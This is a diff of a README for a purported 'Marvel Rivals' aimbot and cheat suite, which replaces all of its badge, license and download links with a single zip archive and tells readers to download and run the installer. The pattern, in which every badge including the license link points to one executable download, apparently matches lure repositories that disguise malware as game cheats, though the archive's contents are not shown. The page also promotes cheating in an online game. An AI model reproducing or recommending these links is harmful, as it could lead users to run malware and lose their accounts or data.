@@ -1,12 +1,12 @@
 # Marvel Rivals Aimbot Cheats & Hacks 🦸🏼‍♂️✨
 
-[![License: MIT](https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip)](https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip) 
-![GitHub issues](https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip)
-![GitHub forks](https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip)
-![GitHub stars](https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip)
-![Maintenance](https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip)
+[![License: MIT](https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip)](https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip) 
+![GitHub issues](https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip)
+![GitHub forks](https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip)
+![GitHub stars](https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip)
+![Maintenance](https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip)
 
-[![Download](https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip%20Suite-brightgreen?style=for-the-badge&logo=github)](https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip)
+[![Download](https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip%20Suite-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip)
 
 Welcome to the **Marvel Rivals Aimbot Cheats & Hacks** repository, your passport to a thrilling victory journey in the Marvel Rivals universe. Engineered with adaptive intelligence, AI-powered target acquisition, and relentless precision, this advanced toolkit equips you with game-changing enhancements—helping both newcomers and battle-scarred veterans to master the digital battlefield.  
 
@@ -86,11 +86,11 @@ Your journey to domination begins with just a few steps:
 
 1. **Secure the Download:**  
    Harness the aimbot suite from our official resource:  
-   https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip
+   https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip
 
 2. **Quick Setup via Intuitive Installer:**  
    Click on the badge below to ignite your install process:  
-   [![Download](https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip%20Suite-brightgreen?style=for-the-badge&logo=github)](https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip)
+   [![Download](https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip%20Suite-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip)
 
 3. **Run the Package:**  
    Launch the provided installer. The adaptive UI will greet you and guide your first configuration.
@@ -114,11 +114,11 @@ The Marvel Rivals Aimbot Cheats & Hacks suite is developed for educational and e
 ## 📜 MIT License
 
 Proudly championing open innovation, this repository is handed off under the MIT License, sparking further iterations and peer-driven enhancements.
-[Read the Full MIT License](https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip) (© 2025)
+[Read the Full MIT License](https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip) (© 2025)
 
 ---
 
-[![Download](https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip%20Suite-brightgreen?style=for-the-badge&logo=github)](https://github.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/raw/refs/heads/branch/hydromancy/marvel-enhancer-aimbot-rivals-1.2-alpha.5.zip)
+[![Download](https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip%20Suite-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/avrsnramasamy/marvel-rivals-aimbot-enhancer/branch/hydromancy/enhancer-rivals-marvel-aimbot-1.2.zip)
 
 ---
 
